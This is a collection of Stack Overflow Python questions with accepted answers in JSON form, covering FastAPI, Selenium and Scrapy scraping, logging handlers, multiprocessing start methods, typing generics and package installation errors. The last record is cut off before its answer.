{
    "Id": 70583980,
    "PostTypeId": 1,
    "Title": "I am unable to create a new virtualenv in ubuntu?",
    "Body": "So, I installed virtualenv in ubuntu terminal. I installed using the following commands:\nsudo apt install python3-virtualenv\npip install virtualenv\n\nBut when I try creating a new virtualenv using:\nvirtualenv -p python3 venv\n\nI am getting the following error:\nAttributeError: module 'virtualenv.create.via_global_ref.builtin.cpython.mac_os' has no attribute 'CPython2macOsArmFramework'\n\nHow can I solve it?\n",
    "AcceptedAnswerId": 70584013,
    "AcceptedAnswer": "You don't need to use virtualenv. You can use this:\npython3 -m venv ./some_env\n\n"
}
{
    "Id": 70658748,
    "PostTypeId": 1,
    "Title": "Using FastAPI in a sync way, how can I get the raw body of a POST request?",
    "Body": "Using FastAPI in a sync, not async mode, I would like to be able to receive the raw, unchanged body of a POST request.\nAll examples I can find show async code, when I try it in a normal sync way, the request.body() shows up as a coroutine object.\nWhen I test it by posting some XML to this endpoint, I get a 500 \"Internal Server Error\".\nfrom fastapi import FastAPI, Response, Request, Body\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef read_root():\n    return {\"Hello\": \"World\"}\n\n@app.post(\"/input\")\ndef input_request(request: Request):\n    # how can I access the RAW request body here?  \n    body = request.body()\n\n    # do stuff with the body here  \n\n    return Response(content=body, media_type=\"application/xml\")\n\nIs this not possible with FastAPI?\nNote: a simplified input request would look like:\nPOST http://127.0.0.1:1083/input\nContent-Type: application/xml\n\n\n    TEST\n\n\nand I have no control over how input requests are sent, because I need to replace an existing SOAP API.\n",
    "AcceptedAnswerId": 70659178,
    "AcceptedAnswer": "Using async def endpoint\nIf an object is a co-routine, it needs to be awaited. FastAPI is actually Starlette underneath, and Starlette methods for returning the request body are async methods (see the source code here as well); thus, one needs to await them (inside an async def endpoint). For example:\nfrom fastapi import Request\n\n@app.post(\"/input\")\nasync def input_request(request: Request):\n    return await request.body()\n\nUpdate 1 - Using def endpoint\nAlternatively, if you are confident that the incoming data is a valid JSON, you can define your endpoint with def instead, and use the Body field, as shown below (for more options on how to post JSON data, see this answer):\nfrom fastapi import Body\n\n@app.post(\"/input\")\ndef input_request(payload: dict = Body(...)):\n    return payload\n\nIf, however, the incoming data are in XML format, as in the example you provided, one option is to pass them using Files instead, as shown below\u2014as long as you have control over how client data are sent to the server (have a look here as well). Example:\nfrom fastapi import File\n\n@app.post(\"/input\") \ndef input_request(contents: bytes = File(...)): \n    return contents\n\nUpdate 2 - Using def endpoint and async dependency\nAs described in this post, you can use an async dependency function to pull out the body from the request. You can use async dependencies on non-async (i.e., def) endpoints as well. Hence, if there is some sort of blocking code in this endpoint that prevents you from using async/await\u2014as I am guessing this might be the reason in your case\u2014this is the way to go.\nNote: I should also mention that this answer\u2014which explains the difference between def and async def endpoints (that you might be aware of)\u2014also provides solutions when you are required to use async def (as you might need to await for coroutines inside a route), but also have some synchronous expensive CPU-bound operation that might be blocking the server. Please have a look.\nExample of the approach described earlier can be found below. You can uncomment the time.sleep() line, if you would like to confirm yourself that a request won't be blocking other requests from going through, as when you declare an endpoint with normal def instead of async def, it is run in an external threadpool (regardless of the async def dependency function).\nfrom fastapi import FastAPI, Depends, Request\nimport time\n\napp = FastAPI()\n\nasync def get_body(request: Request):\n    return await request.body()\n\n@app.post(\"/input\")\ndef input_request(body: bytes = Depends(get_body)):\n    print(\"New request arrived.\")\n    #time.sleep(5)\n    return body\n\n"
}
{
    "Id": 70651053,
    "PostTypeId": 1,
    "Title": "How can I send Dynamic website content to scrapy with the html content generated by selenium browser?",
    "Body": "I am working on certain stock-related projects where I have had a task to scrape all data on a daily basis for the last 5 years. i.e from 2016 to date. I particularly thought of using selenium because I can use crawler and bot to scrape the data based on the date. So I used the use of button click with selenium and now I want the same data that is displayed by the selenium browser to be fed by scrappy.\nThis is the website I am working on right now.\nI have written the following code inside scrappy spider.\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    def start_requests(self):\n\n        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n        \n     \n        floorsheet_dates = ['01/03/2016','01/04/2016', up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))    \n            for data in range(z, z + 1):\n                driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.url = driver.page_source\n                yield Request(url=self.url, callback=self.parse)\n\n               \n    def parse(self, response, **kwargs):\n        for value in response.xpath('//tbody/tr'):\n            print(value.css('td::text').extract()[1])\n            print(\"ok\"*200)\n\nUpdate: Error after answer is\n2022-01-14 14:11:36 [twisted] CRITICAL: \nTraceback (most recent call last):\n  File \"/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/twisted/internet/defer.py\", line 1661, in _inlineCallbacks\n    result = current_context.run(gen.send, result)\n  File \"/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/scrapy/crawler.py\", line 88, in crawl\n    start_requests = iter(self.spider.start_requests())\nTypeError: 'NoneType' object is not iterable\n\nI want to send current web html content to scrapy feeder but I am getting unusal error for past 2 days any help or suggestions will be very much appreciated.\n",
    "AcceptedAnswerId": 70694461,
    "AcceptedAnswer": "The 2 solutions are not very different. Solution #2 fits better to your question, but choose whatever you prefer.\nSolution 1 - create a response with the html's body from the driver and scraping it right away (you can also pass it as an argument to a function):\nimport scrapy\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom scrapy.http import HtmlResponse\n\n\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    def start_requests(self):\n\n        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n        driver = webdriver.Chrome()\n\n        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))\n            for data in range(1, z + 1):\n                driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.body = driver.page_source\n\n                response = HtmlResponse(url=driver.current_url, body=self.body, encoding='utf-8')\n                for value in response.xpath('//tbody/tr'):\n                    print(value.css('td::text').extract()[1])\n                    print(\"ok\"*200)\n\n        # return an empty requests list\n        return []\n\nSolution 2 - with super simple downloader middleware:\n(You might have a delay here in parse method so be patient).\nimport scrapy\nfrom scrapy import Request\nfrom scrapy.http import HtmlResponse\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\n\nclass SeleniumMiddleware(object):\n    def process_request(self, request, spider):\n        url = spider.driver.current_url\n        body = spider.driver.page_source\n        return HtmlResponse(url=url, body=body, encoding='utf-8', request=request)\n\n\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    custom_settings = {\n        'DOWNLOADER_MIDDLEWARES': {\n            'tempbuffer.spiders.yetanotherspider.SeleniumMiddleware': 543,\n            # 'projects_name.path.to.your.pipeline': 543\n        }\n    }\n    driver = webdriver.Chrome()\n\n    def start_requests(self):\n\n        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n\n\n        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            self.driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            self.driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            self.driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = self.driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))\n            for data in range(1, z + 1):\n                self.driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.body = self.driver.page_source\n                self.url = self.driver.current_url\n\n                yield Request(url=self.url, callback=self.parse, dont_filter=True)\n\n    def parse(self, response, **kwargs):\n        print('test ok')\n        for value in response.xpath('//tbody/tr'):\n            print(value.css('td::text').extract()[1])\n            print(\"ok\"*200)\n\nNotice that I've used chrome so change it back to firefox like in your original code.\n"
}
{
    "Id": 70709406,
    "PostTypeId": 1,
    "Title": "Import \"matplotlib\" could not be resolved from source Pylance(reportMissingModuleSource)",
    "Body": "whenever I try to import matplotlib or matplotlib.pyplot in VS Code I get the error in the title:\nImport \"matplotlib\" could not be resolved from source Pylance(reportMissingModuleSource)\n\nor\nImport \"matplotlib.pyplot\" could not be resolved from source Pylance(reportMissingModuleSource)\n\nThe hyperlink of the reportMissingModuleSource sends me to https://github.com/microsoft/pylance-release/blob/main/DIAGNOSTIC_SEVERITY_RULES.md#diagnostic-severity-rules, where it says:\n\"Diagnostics for imports that have no corresponding source file. This happens when a type stub is found, but the module source file was not found, indicating that the code may fail at runtime when using this execution environment. Type checking will be done using the type stub.\"\nHowever, from the explanation I don't understand exactly what's wrong and what I should do to fix this, can someone help me with this?\n",
    "AcceptedAnswerId": 70737017,
    "AcceptedAnswer": "I can reproduce your question when I select a python interpreter where doesn't exist matplotlib:\n\nSo, the solution is opening an integrated Terminal then run pip install matplotlib. After it's installed successfully, please reload window, then the warning should go away.\n"
}
{
    "Id": 70608619,
    "PostTypeId": 1,
    "Title": "How to get message from logging function?",
    "Body": "I have a logger function from logging package that after I call it, I can send the message through logging level.\nI would like to send this message also to another function, which is a Telegram function called SendTelegramMsg().\nHow can I get the message after I call the funcion setup_logger send a message through logger.info(\"Start\") for example, and then send this exatcly same message to SendTelegramMsg() function which is inside setup_logger function?\nMy currently setup_logger function:\n# Define the logging level and the file name\ndef setup_logger(telegram_integration=False):\n    \"\"\"To setup as many loggers as you want\"\"\"\n\n    filename = os.path.join(os.path.sep, pathlib.Path(__file__).parent.resolve(), 'logs', str(dt.date.today()) + '.log')\n    formatter = logging.Formatter('%(levelname)s: %(asctime)s: %(message)s', datefmt='%m/%d/%Y %H:%M:%S')\n    level = logging.DEBUG\n\n    handler = logging.FileHandler(filename, 'a')    \n    handler.setFormatter(formatter)\n\n    consolehandler = logging.StreamHandler()\n    consolehandler.setFormatter(formatter)\n\n    logger = logging.getLogger('logs')\n    if logger.hasHandlers():\n        # Logger is already configured, remove all handlers\n        logger.handlers = []\n    else:\n        logger.setLevel(level)\n        logger.addHandler(handler)        \n        logger.addHandler(consolehandler)\n\n    #if telegram_integration == True:\n        #SendTelegramMsg(message goes here)\n\n    return logger\n\nAfter I call the function setup_logger():\nlogger = setup_logger()\nlogger.info(\"Start\")\n\nThe output:\nINFO: 01/06/2022 11:07:12: Start\n\nHow am I able to get this message and send to SendTelegramMsg() if I enable the integration to True?\n",
    "AcceptedAnswerId": 70742455,
    "AcceptedAnswer": "Implement a custom logging.Handler:\nclass TelegramHandler(logging.Handler):\n\n    def emit(self, record):\n        message = self.format(record)\n        SendTelegramMsg(message)\n        # SendTelegramMsg(message, record.levelno)    # Passing level\n        # SendTelegramMsg(message, record.levelname)  # Passing level name\n\nAdd the handler:\ndef setup_logger(telegram_integration=False):\n    # ...\n\n    if telegram_integration:\n        telegram_handler = TelegramHandler()\n        logger.addHandler(telegram_handler)\n\n    return logger\n\nUsage, no change:\nlogger = setup_logger()\nlogger.info(\"Start\")\n\n"
}
{
    "Id": 70660854,
    "PostTypeId": 1,
    "Title": "How to check if a bot can DM a user",
    "Body": "If a user has the privacy setting \"Allow direct messages from server members\" turned off and a discord bot calls\nawait user.dm_channel.send(\"Hello there\")\n\nYou'll get this error:\ndiscord.errors.Forbidden: 403 Forbidden (error code: 50007): Cannot send messages to this user\n\nI would like to check whether I can message a user without sending them a message. Trying to send a message and catching this error does not work for me, because I don't want a message to get sent in the event that the bot is allowed to message.\nI have tried this:\nprint(user.dm_channel.permissions_for(bot).send_messages)\n\nbut it always returns True, even if the message is not permitted.\nI have also tried this:\nchannel = await user.create_dm()\nif channel is None:\n    ...\n\nbut unfortunately, it seems that \"has permission to message user\" and \"has permission to create a dm channel\" are considered different.\nEDIT\nTo clarify the exact usage since there seems to be a bit of confusion, take this example. There is a server, and 3 users in question: Me, My Bot, and Steve. Steve has \"Allow direct messages from server members\" checked off.\nThe bot has a command called !newgame which accepts a list of users and starts a game amongst them, which involves DMing some of the members of the game. Because of Steve's privacy settings, he cannot play the game (since the bot will need to message him). If I do\n!newgame @DJMcMayhem @Steve\n\nI'd like to provide a response like:\n> I can't start a game with that list of users because @Steve has the wrong privacy settings.\n\nBut as far as I know right now, the only way to find out if Steve can play is by first attempting to message every user, which I'd like to avoid.\n",
    "AcceptedAnswerId": 70780850,
    "AcceptedAnswer": "Explanation\nYou can send an invalid message, which would raise a 400 Bad Request exception, to the dm_channel. This can be accomplished by setting content to None, for example.\nIf it raises 400 Bad Request, you can DM them. If it raises 403 Forbidden, you can't.\nCode\nasync def can_dm_user(user: discord.User) -> bool:\n    ch = user.dm_channel\n    if ch is None:\n        ch = await user.create_dm()\n\n    try:\n        await ch.send()\n    except discord.Forbidden:\n        return False\n    except discord.HTTPException:\n        return True\n\n"
}
{
    "Id": 70810857,
    "PostTypeId": 1,
    "Title": "split geometric progression efficiently in Python (Pythonic way)",
    "Body": "I am trying to achieve a calculation involving geometric progression (split). Is there any effective/efficient way of doing it. The data set has millions of rows.\nI need the column \"Traded_quantity\"\n\n\n\n\n\n\nMarker\nAction\nTraded_quantity\n\n\n\n\n2019-11-05\n09:25\n0\n\n0\n\n\n\n09:35\n2\nBUY\n3\n\n\n\n09:45\n0\n\n0\n\n\n\n09:55\n1\nBUY\n4\n\n\n\n10:05\n0\n\n0\n\n\n\n10:15\n3\nBUY\n56\n\n\n\n10:24\n6\nBUY\n8128\n\n\n\n\nturtle = 2\n(User defined)\nbase_quantity = 1\n(User defined)\n    def turtle_split(row):\n        if row['Action'] == 'BUY':\n            return base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)\n        else:\n            return 0\n    df['Traded_quantity'] = df.apply(turtle_split, axis=1).round(0).astype(int)\n\nCalculation\nFor 0th Row, Traded_quantity should be zero (because the Marker is zero)\nFor 1st Row, Traded_quantity should be (1x1) + (1x2) = 3 (Marker 2 will be split into 1 and 1, First 1 will be multiplied with the base_quantity>>1x1, Second 1 will be multiplied with the result from first 1 times turtle>>1x2), then we make a sum of these two numbers)\nFor 2nd Row, Traded_quantity should be zero (because the Marker is zero)\nFor 3rd Row, Traded_quantity should be (2x2) = 4(Marker 1 will be multiplied with the last split from row 1 time turtle i.e 2x2)\nFor 4th Row, Traded_quantity should be zero(because the Marker is zero)\nFor 5th Row, Traded_quantity should be (4x2)+(4x2x2)+(4x2x2x2) = 56(Marker 3 will be split into 1,1 and 1, First 1 will be multiplied with the last split from row3 times turtle >>4x2, Second 1 will be multiplied with the result from first 1 with turtle>>8x2), third 1 will be multiplied with the result from second 1 with turtle>>16x2) then we make a sum of these three numbers)\nFor 6th Row, Traded_quantity should be (32x2)+(32x2x2)+(32x2x2x2)+(32x2x2x2x2)+(32x2x2x2x2x2) = 8128\nWhenever there will be a BUY, the traded quantity will be calculated using the last batch from Traded_quantity times turtle.\nTurns out the code is generating correct Traded_quantity when there is no zero in Marker. Once there is a gap with a couple of zeros geometric progression will not help, I would require the previous fig(from Cache) to recalculate Traded_q. tried with lru_cache for recursion, didn't work.\n",
    "AcceptedAnswerId": 70811799,
    "AcceptedAnswer": "This should work\ndef turtle_split(row):\n        global base_quantity\n        if row['Action'] == 'BUY':\n            summation = base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)\n            base_quantity = base_quantity * (turtle ** (row['Marker'] - 1))*turtle\n            return summation\n        else:\n            return 0\n\n"
}
{
    "Id": 70565965,
    "PostTypeId": 1,
    "Title": "ERROR: Failed building wheel for numpy , ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects",
    "Body": "I`m using python poetry(https://python-poetry.org/) for dependency management in my project.\nThough when I`m running poetry install, its giving me below error.\nERROR: Failed building wheel for numpy\n  Failed to build numpy\n  ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects\n\n\nI`m having python 3.9 installed in my laptop.\nI installed numpy 1.21.5 using pip install numpy, I even tried to down version it to 1.19.5.\nThough I`m getting the same error.\nI found out many people are getting ERROR: Failed building wheel for numpy this error in python 3.10, they solved it by down versioning python to 3.9, though that didnt working for me.\n",
    "AcceptedAnswerId": 70566445,
    "AcceptedAnswer": "I solved it by doing the following steps:-\n\nI updated the pyproject.toml(This file contains all the library/dependency/dev dependency)with the numpy version that I installed using pip install numpy command.\n\n\nRun poetry lock to update poetry.lock file(contains details information about the library)\n\n\nRun poetry install again, & it should work fine.\n\n\nIf you are having any problems, you can comment.\nI`ll try to answer it.\n"
}
{
    "Id": 70546823,
    "PostTypeId": 1,
    "Title": "Pandas - How to Save A Styled Dataframe to Image",
    "Body": "I have styled a dataframe output and have gotten it to display how I want it in a Jupyter Notebook but I am having issues find a good way to save this as an image. I have tried https://pypi.org/project/dataframe-image/ but the way I have this working it seem to be a NoneType as it's a styler object and errors out when trying to use this library.\nThis is just a snippet of the whole code, this is intended to loop through several 'col_names' and I want to save these as images (to explain some of the coding).\nimport pandas as pd\nimport numpy as np\n\ncol_name = 'TestColumn'\n\ntemp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})\n\nt1 = (temp_df[col_name].fillna(\"Unknown\").value_counts()/len(temp_df)*100).to_frame().reset_index()\nt1.rename(columns={'index':' '}, inplace=True)\nt1[' '] = t1[' '].astype(str) \n\ndisplay(t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=\"font-size: 17px\"').set_properties(\n    **{'color': 'black !important',\n       'border': '1px black solid !important'}\n).set_table_styles([{\n    'selector': 'th',\n    'props': [('border', '1px black solid !important')]\n}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[\" \"], **{'text-align': 'left'}))\n\n[OUTPUT]\n\n",
    "AcceptedAnswerId": 70550426,
    "AcceptedAnswer": "Was able to change how I was using dataframe-image on the styler object and got it working. Passing it into the export() function rather than calling it off the object directly seems to be the right way to do this.\nThe .render() did get the HTML but was often losing much of the styling when converting it to image or when not viewed with Ipython HTML display. See comparision below.\n\nWorking Code:\nimport pandas as pd\nimport numpy as np\nimport dataframe_image as dfi\n\ncol_name = 'TestColumn'\n\ntemp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})\n\nt1 = (temp_df[col_name].fillna(\"Unknown\").value_counts()/len(temp_df)*100).to_frame().reset_index()\nt1.rename(columns={'index':' '}, inplace=True)\nt1[' '] = t1[' '].astype(str) \n\n\nstyle_test = t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=\"font-size: 17px\"').set_properties(\n    **{'color': 'black !important',\n       'border': '1px black solid !important'}\n).set_table_styles([{\n    'selector': 'th',\n    'props': [('border', '1px black solid !important')]\n}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[\" \"], **{'text-align': 'left'})\n\ndfi.export(style_test, 'successful_test.png')\n\n"
}
{
    "Id": 70552775,
    "PostTypeId": 1,
    "Title": "Multiprocess inherently shared memory in no longer working on python 3.10 (coming from 3.6)",
    "Body": "I understand there are a variety of techniques for sharing memory and data structures between processes in python. This question is specifically about this inherently shared memory in python scripts that existed in python 3.6 but seems to no longer exist in 3.10.  Does anyone know why and if it's possible to bring this back in 3.10?  Or what this change that I'm observing is?  I've upgraded my Mac to Monterey and it no longer supports python 3.6, so I'm forced to upgrade to either 3.9 or 3.10+.\nNote:  I tend to develop on Mac and run production on Ubuntu.  Not sure if that factors in here.  Historically with 3.6, everything behaved the same regardless of OS.\nMake a simple project with the following python files\nmyLibrary.py\nMyDict = {}\n\ntest.py\nimport threading\nimport time\nimport multiprocessing\n\nimport myLibrary\n\n\ndef InitMyDict():\n    myLibrary.MyDict = {'woot': 1, 'sauce': 2}\n    print('initialized myLibrary.MyDict to ', myLibrary.MyDict)\n\n\ndef MainLoop():\n    numOfSubProcessesToStart = 3\n    for i in range(numOfSubProcessesToStart):\n        t = threading.Thread(\n            target=CoolFeature(),\n            args=())\n        t.start()\n\n    while True:\n        time.sleep(1)\n\n\ndef CoolFeature():\n    MyProcess = multiprocessing.Process(\n        target=SubProcessFunction,\n        args=())\n    MyProcess.start()\n\n\ndef SubProcessFunction():\n    print('SubProcessFunction: ', myLibrary.MyDict)\n\n\nif __name__ == '__main__':\n    InitMyDict()\n    MainLoop()\n\nWhen I run this on 3.6 it has a significantly different behavior than 3.10.  I do understand that a subprocess cannot modify the memory of the main process, but it is still super convenient to access the main process' data structure that was previously set up as opposed to moving every little tiny thing into shared memory just to read a simple dictionary/int/string/etc.\nPython 3.10 output:\npython3.10 test.py \ninitialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {}\nSubProcessFunction:  {}\nSubProcessFunction:  {}\n\nPython 3.6 output:\npython3.6 test.py \ninitialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\n\nObservation:\nNotice that in 3.6, the subprocess can view the value that was set from the main process.  But in 3.10, the subprocess sees an empty dictionary.\n",
    "AcceptedAnswerId": 70552892,
    "AcceptedAnswer": "In short, since 3.8, CPython uses the spawn start method on MacOs. Before it used the fork method.\nOn UNIX platforms, the fork start method is used which means that every new multiprocessing process is an exact copy of the parent at the time of the fork.\nThe spawn method means that it starts a new Python interpreter for each new multiprocessing process. According to the documentation:\n\nThe child process will only inherit those resources necessary to run the process object\u2019s run() method.\n\nIt will import your program into this new interpreter, so starting processes et cetera sould only be done from within the if __name__ == '__main__':-block!\nThis means you cannot count on variables from the parent process being available in the children, unless they are module level constants which would be imported.\nSo the change is significant.\nWhat can be done?\nIf the required information could be a module-level constant, that would solve the problem in the simplest way.\nIf that is not possible (e.g. because the data needs to be generated at runtime) you could have the parent write the information to be shared to a file. E.g. in JSON format and before it starts other processes. Then the children could simply read this. That is probably the next simplest solution.\nUsing a multiprocessing.Manager would allow you to share a dict between processes. There is however a certain amount of overhead associated with this.\nOr you could try calling multiprocessing.set_start_method(\"fork\") before creating processes or pools and see if it doesn't crash in your case. That would revert to the pre-3.8 method on MacOs. But as documented in this bug, there are real problems with using the fork method on MacOs.\nReading the issue indicates that fork might be OK as long as you don't use threads.\n"
}
{
    "Id": 70583230,
    "PostTypeId": 1,
    "Title": "Union of generic types that is also generic",
    "Body": "Say I have two types (one of them generic) like this\nfrom typing import Generic, TypeVar\nT = TypeVar('T')\nclass A(Generic[T]): pass\nclass B: pass\n\nAnd a union of A and B like this\nC = A|B\n\nOr, in pre-Python-3.10/PEP 604-syntax:\nC = Union[A,B]\n\nHow do I have to change the definition of C, so that C is also generic? e.g. if an object is of type C[int], it is either\n\nof type A[int] (type parameter is passed down) or\nof type B (type parameter is ignored)\n\n",
    "AcceptedAnswerId": 70588199,
    "AcceptedAnswer": "Rereading the mypy documentation I believe I have found my answer:\n\nType aliases can be generic. In this case they can be used in two ways: Subscripted aliases are equivalent to original types with substituted type variables, so the number of type arguments must match the number of free type variables in the generic type alias. Unsubscripted aliases are treated as original types with free variables replaced with Any\n\nSo, to answer my question:\nC = A[T]|B\n\nshould do the trick. And it does!\n"
}
{
    "Id": 70567344,
    "PostTypeId": 1,
    "Title": "EasyOCR Segmentation fault (core dumped)",
    "Body": "I got this issue\npip install easyocr\n\non python env\nimport easyocr\nreader = easyocr.Reader(['en'])\n\nresult = reader.readtext('./reports/dilate/NP6221833_126.png', workers=1)\n\nfinally\nSegmentation fault (core dumped)\n\n",
    "AcceptedAnswerId": 70567354,
    "AcceptedAnswer": "Solved downgrading to the nov 2021 version of opencv\npip install opencv-python-headless==4.5.4.60\n\n"
}
{
    "Id": 70821737,
    "PostTypeId": 1,
    "Title": "WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64 error using Selenium Geckodriver Firefox in FreeBSD jail",
    "Body": "For some tests, I've set up a plain new TrueNAS 12.3 FreeBSD Jail and started it, then installed python3, firefox, geckodriver and pip using the following commands:\npkg install python3 firefox geckodriver py38-pip\npip install --upgrade pip\nsetenv CRYPTOGRAPHY_DONT_BUILD_RUST 1\npip install cryptography==3.4.7\npip install selenium\n\nAfterwards, when I want to use Selenium with Firefox in my Python code, it does not work:\nfrom selenium import webdriver\nfrom selenium.webdriver.firefox.options import Options\noptions = Options()\noptions.headless = True\ndriver = webdriver.Firefox(options=options)\n\nit brings\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/firefox/webdriver.py\", line 174, in __init__\n    self.service.start()\n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py\", line 98, in start\n    self.assert_process_still_running()\n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py\", line 110, in assert_process_still_running\n    raise WebDriverException(\nselenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64\n\nFunnily, on another Jail that I've set up approximately a year ago (approximately in the mentioned way as well), it just works and does not throw the error (so different versions maybe?)!\nThis is the only content of geckodriver.log:\ngeckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context\n\nUSAGE:\n    geckodriver [FLAGS] [OPTIONS]\n\nFor more information try --help\n\nIs there anything I could try to get it working? I've already seen this question, but it seems fairly outdated.\nFirefox 95.0.2, geckodriver 0.26.0, Python 3.8.12, Selenium 4.1.0\n",
    "AcceptedAnswerId": 70822145,
    "AcceptedAnswer": "This error message...\nselenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64\n\nand the GeckoDriver log...\ngeckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context\n\n...implies that the GeckoDriver was unable to initiate/spawn a new Browsing Context i.e. firefox session.\n\nYour main issue is the incompatibility between the version of the binaries you are using as follows:\n\nYour Selenium Client version is 4.1.0.\nBut your GeckoDriver version is 0.26.0.\n\nAs @ernstki mentions in their comment:\n\nYou are running a geckodriver older than 0.30.0, and it is missing the --websocket-port option, which newer/new-ish versions of Selenium seem to depend on.\n\nTo put it in simple words, till the previous GeckoDriver release of v0.29.0 the --websocket-port option wasn't in use, which is now mandatory with Selenium v4.0.1.\nFurther @whimboo also confirmed in his comment:\n\nAs it has been manifested the problem here is not geckodriver but Selenium. As such you should create an issue on the Selenium repository instead, so that an option could be added to not always pass the --websocket-port argument. If that request gets denied you will have to use older releases of Selenium if testing with older geckodriver releases is really needed.\n\n\nSolution\nEnsure that:\n\nSelenium is upgraded to current levels Version 4.1.0.\nGeckoDriver is upgraded to GeckoDriver v0.30.0 level.\nFirefox is upgraded to current Firefox v96.0.2 levels.\n\n\nFreeBSD versions\nIncase you are using FreeBSD versions where the GeckoDriver versions are older, in those cases you have to downgrade Selenium to v3.x levels.\nCommands (courtesy: Kurtibert):\n\nUninstall Selenium:\npip3 uninstall selenium;\n\n\nInstall Selenium:\npip3 install 'selenium<4.0.0'\n\n\n\n"
}
{
    "Id": 70596809,
    "PostTypeId": 1,
    "Title": "Can a class attribute shadow a built-in in Python?",
    "Body": "If have some code like this:\nclass Foo():\n   def open(self, bar):\n       # Doing some fancy stuff here, i.e. opening \"bar\"\n       pass\n\nWhen I run flake8 with the flake8-builtins plug-in I get the error\nA003 class attribute \"open\" is shadowing a python builtin\n\nI don't understand how the method could possibly shadow the built-in open-function, because the method can only be called using an instance (i.e. self.open(\"\") or someFoo.open(\"\")). Is there some other way code expecting to call the built-in ends up calling the method? Or is this a false positive of the flake8-builtins plug-in?\n",
    "AcceptedAnswerId": 70597023,
    "AcceptedAnswer": "Not really a practical case, but your code would fail if you wanted to use the built-it functions on the class level after your shadowed function has been initialized:\nclass Foo:\n    def open(self, bar):\n        pass\n\n    with open('myfile.txt'):\n        print('did I get here?')\n\n>>> TypeError: open() missing 1 required positional argument: 'bar'\n\nThe same would also be true with other built-in functions, such as print\nclass Foo:\n    def print(self, bar):\n        pass\n\n    print('did I get here?')\n\n>>> TypeError: print() missing 1 required positional argument: 'bar'\n\n"
}
{
    "Id": 70617258,
    "PostTypeId": 1,
    "Title": "session object in Fastapi similar to flask",
    "Body": "I am trying to use session to pass variables across view functions in fastapi. However, I do not find any doc which specifically says of about session object. Everywhere I see, cookies are used. Is there any way to convert the below flask code in fastapi? I want to keep session implementation as simple as possible.\nfrom flask import Flask, session, render_template, request, redirect, url_for\n\n\napp=Flask(__name__)\napp.secret_key='asdsdfsdfs13sdf_df%&'   \n\n@app.route('/a')\ndef a():\n    session['my_var'] = '1234'              \n    return redirect(url_for('b'))          \n\n\n@app.route('/b')\ndef b():\n    my_var = session.get('my_var', None)\n    return my_var    \n\n\nif __name__=='__main__':\n    app.run(host='0.0.0.0', port=5000, debug = True)\n\n",
    "AcceptedAnswerId": 70630483,
